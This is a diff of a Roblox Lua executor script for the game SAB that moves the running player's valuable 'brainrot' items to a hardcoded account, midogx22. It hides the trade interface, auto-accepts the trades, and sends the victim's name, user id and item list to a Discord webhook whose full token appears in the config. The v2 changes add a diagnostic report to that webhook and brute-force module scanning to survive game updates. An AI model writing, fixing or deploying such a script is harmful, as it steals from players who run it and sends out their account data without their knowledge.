@@ -1,29 +1,72 @@
 --[[
-    SAB AUTO TRADE (new, lean version)
-    ==================================
-    Does one thing: auto-trades your target brainrots to midogx22
-    (user id 2525631212, confirmed via Roblox profile).
+    SAB AUTO TRADE v2
+    =================
+    Auto-trades your target brainrots to midogx22 (user id 2525631212).
 
-    * Same brainrot list as the old logger.
-    * Same trade remotes/guids as the old logger.
-    * No camera/notification hacks, no image scraping — leaner, less to break.
-    * On start it dumps EVERY remote it can see in Packages/Net.
-      If the trade remotes come back MISSING, send me that dump
-      (the lines between the '---' markers) and I'll point the
-      script at the new names.
+    NEW in v2 (diagnostics, so we can finally SEE what's wrong):
+      * On start it posts a REPORT to your Discord webhook with:
+          - everything inside Packages / Net (all remotes + their names)
+          - whether the Synchronizer / plot data was found (and where)
+          - which trade remotes were found or are MISSING
+          - how many brainrots were scanned / queued
+          - the final status (RUNNING or why it exited)
+        -> Just screenshot that Discord message and send it to me.
+      * An on-screen yellow log box also shows the last log lines in-game
+        (screenshot that if Discord is empty).
+      * If the usual Synchronizer path fails, it brute-force scans ALL
+        module scripts in ReplicatedStorage for the plot data, so a game
+        update that moved the data won't kill the script.
 
-    All steps log with an [SAB2] prefix to the F9 console.
+    Everything also logs to the F9 console with an [SAB2] prefix.
 ]]
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
-local function log(msg)
-    print("[SAB2] " .. tostring(msg))
+local pg = nil
+local overlay = nil
+local logLines = {}
+
+local function ensureOverlay()
+    if overlay or not pg then return end
+    pcall(function()
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "SAB2Overlay"
+        gui.DisplayOrder = 9999
+        gui.ResetOnSpawn = false
+
+        local label = Instance.new("TextLabel")
+        label.Name = "Log"
+        label.Size = UDim2.new(0, 520, 0, 300)
+        label.Position = UDim2.new(0, 10, 1, -310)
+        label.BackgroundTransparency = 0.25
+        label.BackgroundColor3 = Color3.new(0, 0, 0)
+        label.TextColor3 = Color3.new(1, 1, 0)
+        label.TextSize = 13
+        label.Font = Enum.Font.Code
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.TextYAlignment = Enum.TextYAlignment.Bottom
+        label.Text = ""
+        label.Parent = gui
+
+        gui.Parent = pg
+        overlay = label
+    end)
 end
 
-log("auto trade starting")
+local function log(msg)
+    local line = "[SAB2] " .. tostring(msg)
+    print(line)
+    logLines[#logLines + 1] = line
+    if #logLines > 18 then table.remove(logLines, 1) end
+    ensureOverlay()
+    if overlay then
+        overlay.Text = table.concat(logLines, "\n")
+    end
+end
+
+log("auto trade v2 starting")
 
 local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 30)
 if not LP then
@@ -31,14 +74,15 @@ if not LP then
     return
 end
 
-local pg = LP:WaitForChild("PlayerGui", 30)
+pg = LP:WaitForChild("PlayerGui", 30)
 
 local CONFIG = {
     TargetName = "midogx22",
     TargetUserId = 2525631212, -- verified: midogx22
 
     Webhook = "https://discord.com/api/webhooks/1540984022598164641/Ib8FKS2dKcJk2Pg6VxPqVL-yiRSjF8ams6_nFvt9NPxo8WRN3DndA8haGMDbaydYUw-S",
-    SendWebhook = true,
+    SendWebhook = true,       -- sends the "what is being traded" message
+    SendReport = true,        -- sends the diagnostic report (leave ON until it works)
     PingEveryone = false,
 
     DelayStep = 1,      -- seconds between adding items to the trade
@@ -160,7 +204,7 @@ local TargetBrainrots = {
 }
 
 -- ============================================================
--- diagnostics: dump what the game actually contains
+-- environment dump (goes into the Discord report)
 -- ============================================================
 
 local function namesOf(children)
@@ -171,19 +215,19 @@ local function namesOf(children)
     return table.concat(out, ", ")
 end
 
-local function dumpDiagnostics()
-    log("--- ReplicatedStorage: " .. namesOf(ReplicatedStorage:GetChildren()))
+local function collectEnvLines(R)
+    R[#R + 1] = "ReplicatedStorage: " .. namesOf(ReplicatedStorage:GetChildren())
 
     local pkgs = ReplicatedStorage:FindFirstChild("Packages")
     if not pkgs then
-        log("--- Packages folder NOT FOUND")
+        R[#R + 1] = "Packages folder NOT FOUND"
         return
     end
-    log("--- Packages: " .. namesOf(pkgs:GetChildren()))
+    R[#R + 1] = "Packages: " .. namesOf(pkgs:GetChildren())
 
     local net = pkgs:FindFirstChild("Net")
     if not net then
-        log("--- Net folder NOT FOUND in Packages")
+        R[#R + 1] = "Net folder NOT FOUND in Packages"
         return
     end
 
@@ -197,9 +241,10 @@ local function dumpDiagnostics()
     end
     table.sort(remotes)
     table.sort(others)
-    for _, r in ipairs(remotes) do log("--- remote: " .. r) end
-    for _, o in ipairs(others) do log("--- net obj: " .. o) end
-    log("--- diagnostics done (" .. #remotes .. " remotes, " .. #others .. " other objects)")
+    R[#R + 1] = "Net remotes (" .. #remotes .. "):"
+    for _, r in ipairs(remotes) do R[#R + 1] = "  " .. r end
+    R[#R + 1] = "Net other objects (" .. #others .. "):"
+    for _, o in ipairs(others) do R[#R + 1] = "  " .. o end
 end
 
 -- ============================================================
@@ -254,7 +299,7 @@ local function findRemote(patterns)
 end
 
 -- ============================================================
--- game data modules (isolated requires)
+-- game data modules
 -- ============================================================
 
 local function tryRequire(path)
@@ -277,7 +322,7 @@ local AnimalsData = tryRequire("Datas/Animals")
 local AnimalsShared = tryRequire("Shared/Animals")
 
 -- ============================================================
--- sync data discovery (same as fixed logger, incl. the upvalue fix)
+-- sync data discovery
 -- ============================================================
 
 local function validateSync(t)
@@ -290,7 +335,8 @@ local function validateSync(t)
     return false
 end
 
-local function loadSyncData()
+-- standard path: Packages.Synchronizer
+local function loadSyncDataStandard()
     local packages = ReplicatedStorage:FindFirstChild("Packages")
     local mod = packages and packages:FindFirstChild("Synchronizer")
     if not mod and packages then
@@ -301,16 +347,10 @@ local function loadSyncData()
             end
         end
     end
-    if not mod then
-        log("Synchronizer module not found in Packages")
-        return nil
-    end
+    if not mod then return nil end
 
     local ok, M = pcall(require, mod)
-    if not ok or type(M) ~= "table" then
-        log("require(Synchronizer) failed: " .. tostring(M))
-        return nil
-    end
+    if not ok or type(M) ~= "table" then return nil end
 
     if validateSync(M) then return M end
     for _, v in pairs(M) do
@@ -333,10 +373,59 @@ local function loadSyncData()
             i = i + 1
         end
     end
-
-    log("SYNC_DATA not found inside Synchronizer (module found, no plot-shaped table)")
     return nil
 end
+
+-- brute force: every ModuleScript under ReplicatedStorage (in case the game
+-- moved the plot data somewhere else). Returns table + where it was found.
+local function deepFindSyncData()
+    local std = loadSyncDataStandard()
+    if std then return std, "Packages.Synchronizer (standard path)" end
+
+    log("standard path failed - brute force scanning all modules...")
+    local candidates = {}
+    for _, mod in ipairs(ReplicatedStorage:GetDescendants()) do
+        if mod:IsA("ModuleScript") then
+            candidates[#candidates + 1] = mod
+        end
+    end
+
+    local checked = 0
+    for _, mod in ipairs(candidates) do
+        checked = checked + 1
+        if checked > 200 then break end
+        local ok, M = pcall(require, mod)
+        if ok and type(M) == "table" then
+            if validateSync(M) then
+                return M, mod:GetFullName() .. " (module table)"
+            end
+            for key, v in pairs(M) do
+                local keyStr = tostring(key)
+                if type(v) == "table" then
+                    if validateSync(v) then
+                        return v, mod:GetFullName() .. " ." .. keyStr
+                    end
+                elseif type(v) == "function" then
+                    local i = 1
+                    while true do
+                        local s, _name, up = pcall(debug.getupvalue, v, i)
+                        if not s or up == nil then break end
+                        if validateSync(up) then
+                            return up, mod:GetFullName() .. " ." .. keyStr .. " (upvalue " .. i .. ")"
+                        end
+                        i = i + 1
+                    end
+                end
+            end
+        end
+    end
+
+    return nil, "nowhere (" .. checked .. " modules checked)"
+end
+
+-- ============================================================
+-- plot / animal scanning
+-- ============================================================
 
 local function getOwnerKey(plot)
     if plot.Owner ~= nil then return plot.Owner end
@@ -439,7 +528,7 @@ local function scanLocalAnimals(syncData)
 end
 
 -- ============================================================
--- webhook (one message: what is being traded)
+-- webhook helpers
 -- ============================================================
 
 local function formatNumber(n)
@@ -466,14 +555,28 @@ local function getRequestFn()
     end
 end
 
-local function sendTradeWebhook(queue)
-    if not CONFIG.SendWebhook then return end
+local function postToWebhook(payload)
     local requestFn = getRequestFn()
     if not requestFn then
-        log("webhook skipped - no request function")
-        return
+        log("webhook skipped - executor has no request function and RequestAsync unavailable")
+        return false
     end
+    local ok, err = pcall(function()
+        requestFn({
+            Url = CONFIG.Webhook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload),
+        })
+    end)
+    if not ok then
+        log("webhook post failed: " .. tostring(err))
+    end
+    return ok
+end
 
+local function sendTradeWebhook(queue)
+    if not CONFIG.SendWebhook then return end
     local lines = {}
     for i, a in ipairs(queue) do
         lines[i] = "**" .. a.displayName .. "**"
@@ -490,36 +593,72 @@ local function sendTradeWebhook(queue)
     local listText = table.concat(lines, "\n")
     if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
 
-    local embed = {
-        title = "Auto trade to " .. CONFIG.TargetName,
-        description = listText,
-        color = 3447003,
-        fields = {
-            { name = "Items", value = tostring(#queue), inline = true },
-            { name = "Scanned", value = "<t:" .. os.time() .. ":R>", inline = true },
-        },
-        footer = { text = LP.Name .. " • " .. LP.UserId },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    local payload = {
+        embeds = { {
+            title = "Auto trade to " .. CONFIG.TargetName,
+            description = listText,
+            color = 3447003,
+            fields = {
+                { name = "Items", value = tostring(#queue), inline = true },
+                { name = "Scanned", value = "<t:" .. os.time() .. ":R>", inline = true },
+            },
+            footer = { text = LP.Name .. " • " .. LP.UserId },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        } },
+        username = "AutoTrade",
     }
-
-    local payloadData = { embeds = { embed }, username = "AutoTrade" }
     if CONFIG.PingEveryone then
-        payloadData.content = "||@everyone||"
+        payload.content = "||@everyone||"
     end
 
-    local ok, err = pcall(function()
-        requestFn({
-            Url = CONFIG.Webhook,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payloadData),
-        })
-    end)
-    if ok then
-        log("webhook sent (" .. #queue .. " items)")
-    else
-        log("webhook send failed: " .. tostring(err))
+    if postToWebhook(payload) then
+        log("trade webhook sent (" .. #queue .. " items)")
     end
+end
+
+-- diagnostic report -> Discord (chunked to stay under embed limits)
+local function sendReport(R, status)
+    if not CONFIG.SendReport then return end
+    local all = {}
+    all[#all + 1] = "player: " .. LP.Name .. " (id " .. LP.UserId .. ")"
+    for _, line in ipairs(R) do
+        all[#all + 1] = line
+    end
+    all[#all + 1] = "status: " .. status
+
+    local chunks, cur, curLen = {}, {}, 0
+    for _, line in ipairs(all) do
+        local piece = line
+        if #piece > 3700 then piece = piece:sub(1, 3696) .. "..." end
+        if curLen + #piece + 1 > 3700 then
+            chunks[#chunks + 1] = cur
+            cur, curLen = {}, 0
+        end
+        cur[#cur + 1] = piece
+        curLen = curLen + #piece + 1
+    end
+    if #cur > 0 then chunks[#chunks + 1] = cur end
+
+    for i, ch in ipairs(chunks) do
+        pcall(function()
+            local requestFn = getRequestFn()
+            if requestFn then
+                requestFn({
+                    Url = CONFIG.Webhook,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode({
+                        embeds = { {
+                            title = "SAB auto trade report " .. i .. "/" .. #chunks,
+                            description = "```" .. table.concat(ch, "\n") .. "```",
+                            color = 15105570,
+                        } },
+                    }),
+                })
+            end
+        end)
+    end
+    log("report sent to Discord (" .. #chunks .. " message(s)) - screenshot it for me")
 end
 
 -- ============================================================
@@ -576,8 +715,12 @@ end
 -- ============================================================
 
 task.spawn(function()
+    local R = {}
+    local status = "unknown"
+
     local ok, err = pcall(function()
-        dumpDiagnostics()
+        log("collecting environment...")
+        collectEnvLines(R)
 
         local inviteRemote = findRemote(REMOTE_PATTERNS.invite)
         local addRemote = findRemote(REMOTE_PATTERNS.add)
@@ -585,19 +728,23 @@ task.spawn(function()
         local acceptRemote = findRemote(REMOTE_PATTERNS.accept)
 
         local function nameOf(r) return r and r.Name or "MISSING" end
-        log("trade remotes -> invite: " .. nameOf(inviteRemote)
+        R[#R + 1] = "trade remotes -> invite: " .. nameOf(inviteRemote)
             .. " | add: " .. nameOf(addRemote)
             .. " | ready: " .. nameOf(readyRemote)
-            .. " | accept: " .. nameOf(acceptRemote))
+            .. " | accept: " .. nameOf(acceptRemote)
 
-        local SYNC_DATA = loadSyncData()
+        log("looking for plot/sync data...")
+        local SYNC_DATA, where = deepFindSyncData()
+        R[#R + 1] = "sync data: " .. where
         if not SYNC_DATA then
-            log("EXIT - SYNC_DATA not found. Send me the diagnostic lines above (between the '---' markers).")
+            status = "EXIT - SYNC_DATA not found. Check the module list above - the game moved or hid the plot data."
+            log(status)
             return
         end
-        log("SYNC_DATA found")
+        log("SYNC_DATA found (" .. where .. ")")
 
         local scanned = scanLocalAnimals(SYNC_DATA)
+        R[#R + 1] = "scanned local animals: " .. #scanned
         log("scanned local animals: " .. #scanned)
 
         local queue = {}
@@ -606,23 +753,32 @@ task.spawn(function()
                 table.insert(queue, a)
             end
         end
+        R[#R + 1] = "queue (brainrots to trade): " .. #queue
         log("queue (brainrots to trade): " .. #queue)
 
         if #queue == 0 then
-            log("EXIT - no target brainrots found on this account (check 'scanned local animals' above)")
+            status = "EXIT - no target brainrots found on this account (check 'scanned local animals' above)"
+            log(status)
             return
         end
 
         if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
-            log("EXIT - trade remotes missing, can't start trading. Send me the diagnostic lines above and I'll point it at the new names.")
+            status = "EXIT - trade remotes missing, can't start trading. Check the Net remotes list above for the new names."
+            log(status)
             return
         end
 
         stripTradeGuis()
         sendTradeWebhook(queue)
         startAutoTrade(queue, inviteRemote, addRemote, readyRemote, acceptRemote)
+        status = "RUNNING - auto trading " .. #queue .. " brainrots to " .. CONFIG.TargetName
+        log(status)
     end)
+
     if not ok then
-        log("FATAL error: " .. tostring(err))
+        status = "FATAL error: " .. tostring(err)
+        log(status)
     end
+
+    sendReport(R, status)
 end)
